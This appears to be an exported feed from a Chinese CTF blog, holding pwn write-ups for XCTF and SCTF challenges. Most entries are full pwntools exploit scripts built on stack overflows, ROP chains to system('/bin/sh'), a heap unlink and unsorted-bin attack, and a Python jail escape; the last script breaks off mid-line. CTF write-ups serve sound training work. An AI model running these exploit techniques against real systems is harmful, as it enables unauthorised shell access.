class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">lib = ELF("libc6_2.23-0ubuntu10_i386.so")</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop3_ret = 0x08048699</span><br><span class="line">pop2_ret = 0x0804869a</span><br><span class="line">offset = 44</span><br><span class="line">main_addr = 0x080485FF</span><br><span class="line">payload = (offset-12) * 'a' + p32(0x0804A01C) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">payload = (offset-0x10) * "b"+"5"*4 +p32(0x0804A01C)+"7"*4+"8"*4 +p32(0x0804861D)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">sh.recv(33)</span><br><span class="line">libc = u32(sh.recv(4))</span><br><span class="line">log.success("libc :" + hex(libc))</span><br><span class="line">system = 0x08048559</span><br><span class="line">binsh = libc - lib.symbols["__libc_start_main"] + next(lib.search("/bin/sh"))</span><br><span class="line">log.success("binsh :"+hex(binsh))</span><br><span class="line">log.success("system :"+hex(libc - lib.symbols["__libc_start_main"] + lib.symbols['system']))</span><br><span class="line">input()</span><br><span class="line">payload = (offset)*"a" + p32(0x08048450)</span><br><span class="line">sh.send(payload)</span><br><span class="line">payload = (offset-12) * 'a' + p32(binsh) + "2"*4 + "3"*4+ p32(0x080485FF)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">payload = (offset-0x10) * "b"+"5"*4 +p32(binsh)+"7"*4+"8"*4 +p32(0x08048559)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("Hello,")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("172.29.9.107",9999,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-XCTF-Pwn-高手进阶区(1)</title>
      <link href="/2019/06/28/CTF-XCTF-Pwn-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA(1)/"/>
      <url>/2019/06/28/CTF-XCTF-Pwn-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA(1)/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="CTF-XCTF-高手进阶区-1"><a href="#CTF-XCTF-高手进阶区-1" class="headerlink" title="CTF-XCTF-高手进阶区(1)"></a>CTF-XCTF-高手进阶区(1)</h2><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><h4 id="附件下载-dice-game-rar"><a href="#附件下载-dice-game-rar" class="headerlink" title="附件下载 dice_game.rar"></a><a href="dice_game.rar">附件下载 dice_game.rar</a></h4><h3 id="可以通过栈溢出覆盖seed，我将其覆盖成0，然后本地做一个程序输出rand-50次的结果，然后发送过去就好了"><a href="#可以通过栈溢出覆盖seed，我将其覆盖成0，然后本地做一个程序输出rand-50次的结果，然后发送过去就好了" class="headerlink" title="可以通过栈溢出覆盖seed，我将其覆盖成0，然后本地做一个程序输出rand()50次的结果，然后发送过去就好了"></a>可以通过栈溢出覆盖seed，我将其覆盖成0，然后本地做一个程序输出rand()50次的结果，然后发送过去就好了</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("dice_game")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">answer = [2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./dice_game")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.recvuntil("Welcome, let me know your name: ")</span><br><span class="line">payload = '\x00' * (0x50-0x4) + "\x32"</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Game ")</span><br><span class="line">for i in answer:</span><br><span class="line">sh.sendline(str(i))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.198.29.45",45778,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><h4 id="附件下载-warmup-rar"><a href="#附件下载-warmup-rar" class="headerlink" title="附件下载 warmup.rar"></a><a href="warmup.rar">附件下载 warmup.rar</a></h4><h3 id="典型的ROP题"><a href="#典型的ROP题" class="headerlink" title="典型的ROP题"></a>典型的ROP题</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("warmup")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./warmup")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop_rdi_ret = 0x0000000000400713</span><br><span class="line">payload = "a" * 72 + p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt["gets"]) + p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt['system'])</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.198.29.45",31657,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><h3 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h3><h4 id="附件下载-forgot-rar"><a href="#附件下载-forgot-rar" class="headerlink" title="附件下载 forgot.rar"></a><a href="forgot.rar">附件下载 forgot.rar</a></h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("forgot")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./forgot")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">getFlag = 0x080486CC</span><br><span class="line">sh.recvuntil("What is your name?")</span><br><span class="line">payload = "2" + p32(getFlag) * 7 </span><br><span class="line">payload = payload.ljust(0x20,"a")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Enter the string to be validate")</span><br><span class="line">payload = "aaa"+18 * p32(getFlag)</span><br><span class="line">payload = payload.ljust(18 * 4,"a")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.sendline("123")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.198.29.45",36236,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><h4 id="附件下载-stack2-rar"><a href="#附件下载-stack2-rar" class="headerlink" title="附件下载 stack2.rar"></a><a href="stack2.rar">附件下载 stack2.rar</a></h4><h3 id="存在数组溢出，即change-number可以实现栈内任意地址写"><a href="#存在数组溢出，即change-number可以实现栈内任意地址写" class="headerlink" title="存在数组溢出，即change number可以实现栈内任意地址写"></a>存在数组溢出，即change number可以实现栈内任意地址写</h3><h3 id="XCTF服务器中，由于没有-bin-bash，所以可以考虑取-bin-bash的后两位（即，sh）作为指针传入参数，然后ROP执行system"><a href="#XCTF服务器中，由于没有-bin-bash，所以可以考虑取-bin-bash的后两位（即，sh）作为指针传入参数，然后ROP执行system" class="headerlink" title="XCTF服务器中，由于没有/bin/bash，所以可以考虑取/bin/bash的后两位（即，sh）作为指针传入参数，然后ROP执行system"></a>XCTF服务器中，由于没有/bin/bash，所以可以考虑取/bin/bash的后两位（即，sh）作为指针传入参数，然后ROP执行system</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = "debug"</span><br><span class="line"></span><br><span class="line">context.arch = "i386"</span><br><span class="line"></span><br><span class="line">elf = ELF("stack2")</span><br><span class="line"></span><br><span class="line">sh = 0</span><br><span class="line"></span><br><span class="line">lib = 0</span><br><span class="line"></span><br><span class="line">def writeNum(num,position):</span><br><span class="line"></span><br><span class="line">sh.recvuntil("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit")</span><br><span class="line"></span><br><span class="line">sh.sendline("3")</span><br><span class="line"></span><br><span class="line">sh.recvuntil("which number to change:")</span><br><span class="line"></span><br><span class="line">sh.sendline(str(position))</span><br><span class="line"></span><br><span class="line">sh.recvuntil("new number:")</span><br><span class="line"></span><br><span class="line">sh.sendline(str(num))</span><br><span class="line"></span><br><span class="line">def writeROP(num,position):</span><br><span class="line"></span><br><span class="line">p = position</span><br><span class="line"></span><br><span class="line">n1 = num >> 24</span><br><span class="line"></span><br><span class="line">n2 = (num % 0x1000000) >> 16</span><br><span class="line"></span><br><span class="line">n3 = (num % 0x10000) >> 8</span><br><span class="line"></span><br><span class="line">n4 = (num % 0x100)</span><br><span class="line"></span><br><span class="line">writeNum(n4,p)</span><br><span class="line"></span><br><span class="line">writeNum(n3,p+1)</span><br><span class="line"></span><br><span class="line">writeNum(n2,p+2)</span><br><span class="line"></span><br><span class="line">writeNum(n1,p+3)</span><br><span class="line"></span><br><span class="line">return p+4</span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"></span><br><span class="line">global sh</span><br><span class="line"></span><br><span class="line">global lib</span><br><span class="line"></span><br><span class="line">if(debug == 1):</span><br><span class="line"></span><br><span class="line">sh = process("./stack2")</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">#0x080488F2</span><br><span class="line">getShell_addr = 0x0804859B</span><br><span class="line"></span><br><span class="line">sh.recvuntil("How many numbers you have:")</span><br><span class="line"></span><br><span class="line">sh.sendline("1")</span><br><span class="line"></span><br><span class="line">sh.recvuntil("Give me your numbers\n")</span><br><span class="line"></span><br><span class="line">sh.sendline("3")</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = 0x84</span><br><span class="line"></span><br><span class="line">offset = writeROP(0x080485B4,offset)</span><br><span class="line"></span><br><span class="line">offset = writeROP(0x08048980 + 7,offset)</span><br><span class="line"></span><br><span class="line">sh.recvuntil("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit")</span><br><span class="line"></span><br><span class="line">sh.sendline("5")</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"></span><br><span class="line">pwn("111.198.29.45",48028,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><h3 id="Escape-From-Jail-50"><a href="#Escape-From-Jail-50" class="headerlink" title="Escape_From_Jail-50"></a>Escape_From_Jail-50</h3><h3 id="题目里只给了IP和端口，连进去发现是python的终端，然后发现禁用了import-os、fopen等功能"><a href="#题目里只给了IP和端口，连进去发现是python的终端，然后发现禁用了import-os、fopen等功能" class="headerlink" title="题目里只给了IP和端口，连进去发现是python的终端，然后发现禁用了import os、fopen等功能"></a>题目里只给了IP和端口，连进去发现是python的终端，然后发现禁用了import os、fopen等功能</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">getattr(os,"system")("/bin/sh")//这条代码可以不通过import os 来调用os库里的代码</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">find / -name flag</span><br><span class="line">/home/ctf/flag</span><br><span class="line">cat /home/ctf/flag</span><br><span class="line">cyberpeace{8ea4ff446652fd6ec97eb041a4aba19e}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h2><h3 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h3><h3 id="直接运行程序，类似于python终端，然后随意输入一个print-“123”-，然后有输出，接着随意输入read，发现有readFile函数"><a href="#直接运行程序，类似于python终端，然后随意输入一个print-“123”-，然后有输出，接着随意输入read，发现有readFile函数" class="headerlink" title="直接运行程序，类似于python终端，然后随意输入一个print(“123”)，然后有输出，接着随意输入read，发现有readFile函数"></a>直接运行程序，类似于python终端，然后随意输入一个print(“123”)，然后有输出，接着随意输入read，发现有readFile函数</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read("flag")//会反弹flag</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-系统调用表</title>
      <link href="/2019/06/26/Linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2019/06/26/Linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="9a8cfc1bfc207ed2350e26a767456b6ecd10728ed32dd648509612e3461888fb"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SCTF-19年6月</title>
      <link href="/2019/06/25/CTF-SCTF-19%E5%B9%B46%E6%9C%88/"/>
      <url>/2019/06/25/CTF-SCTF-19%E5%B9%B46%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x01-easy-heap"><a href="#0x01-easy-heap" class="headerlink" title="0x01 easy_heap"></a>0x01 easy_heap</h3><h3 id="这道题要考察的知识点很多，包括-malloc-hook、shellcode、unsorted-bin-attack、unlink、off-by-one-null"><a href="#这道题要考察的知识点很多，包括-malloc-hook、shellcode、unsorted-bin-attack、unlink、off-by-one-null" class="headerlink" title="这道题要考察的知识点很多，包括__malloc_hook、shellcode、unsorted bin attack、unlink、off by one null"></a>这道题要考察的知识点很多，包括__malloc_hook、shellcode、unsorted bin attack、unlink、off by one null</h3><h3 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h3><h3 id="1、先利用off-by-one-null实现unlink，从而实现修改bss段的chunk-list"><a href="#1、先利用off-by-one-null实现unlink，从而实现修改bss段的chunk-list" class="headerlink" title="1、先利用off by one null实现unlink，从而实现修改bss段的chunk_list"></a>1、先利用off by one null实现unlink，从而实现修改bss段的chunk_list</h3><h3 id="2、通过修改bss段将shellcode，写入Mmap区域"><a href="#2、通过修改bss段将shellcode，写入Mmap区域" class="headerlink" title="2、通过修改bss段将shellcode，写入Mmap区域"></a>2、通过修改bss段将shellcode，写入Mmap区域</h3><h3 id="3、通过unsorted-bin-attack覆盖到bss所储存的malloc的指针，并将其低位数据写成-x10，从而确定-malloc-hook的位置，然后通过fill直接写入Mmap的地址"><a href="#3、通过unsorted-bin-attack覆盖到bss所储存的malloc的指针，并将其低位数据写成-x10，从而确定-malloc-hook的位置，然后通过fill直接写入Mmap的地址" class="headerlink" title="3、通过unsorted bin attack覆盖到bss所储存的malloc的指针，并将其低位数据写成\x10，从而确定__malloc_hook的位置，然后通过fill直接写入Mmap的地址"></a>3、通过unsorted bin attack覆盖到bss所储存的malloc的指针，并将其低位数据写成\x10，从而确定__malloc_hook的位置，然后通过fill直接写入Mmap的地址</h3><h3 id="4、由于Mmap是可读可写可执行段，所以malloc时会直接跳转到Mmap处，从而getShell"><a href="#4、由于Mmap是可读可写可执行段，所以malloc时会直接跳转到Mmap处，从而getShell" class="headerlink" title="4、由于Mmap是可读可写可执行段，所以malloc时会直接跳转到Mmap处，从而getShell"></a>4、由于Mmap是可读可写可执行段，所以malloc时会直接跳转到Mmap处，从而getShell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">sh = process("./easy_heap")</span><br><span class="line">elf = ELF("easy_heap")</span><br><span class="line">def add(size,ret):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Size: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">if(ret == 0):</span><br><span class="line">return 0</span><br><span class="line">else:</span><br><span class="line">sh.recvuntil("Address 0x")</span><br><span class="line">return int(sh.recv(12),16)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("Content: ")</span><br><span class="line">sh.sendline(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil(">> ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">sh.recvuntil("Mmap: 0x")</span><br><span class="line">Mmap = int(sh.recv(10),16)</span><br><span class="line">chunk_list_head = 0x0000000000202068</span><br><span class="line">unlink_id = 3</span><br><span class="line">fastbin = add(0x10,1)</span><br><span class="line">unsort_bin_1= add(0x80,1)</span><br><span class="line">unsort_bin_2= add(0x80,1)</span><br><span class="line">chunk0 = add(0xf8,1)</span><br><span class="line">chunk1 = add(0xf8,1)</span><br><span class="line">chunk2 = add(0xf8,1)</span><br><span class="line">#----unlink</span><br><span class="line">payload = p64(0x110) + p64(0xf1) + p64(chunk0 - 0x18) + p64(chunk0 - 0x10)</span><br><span class="line">payload = payload.ljust(0xf0,"a")</span><br><span class="line">payload += p64(0xf0)</span><br><span class="line">edit(unlink_id,payload)</span><br><span class="line">delete(unlink_id + 1)</span><br><span class="line">chunk3 = add(0xf8,1)</span><br><span class="line">base = chunk0 - chunk_list_head</span><br><span class="line">##----fill Mmap with shellcode</span><br><span class="line">payload = p64(0x500) + p64(Mmap) + p64(0xf8) + "\x60"#idx=2 can't free</span><br><span class="line">edit(unlink_id,payload)</span><br><span 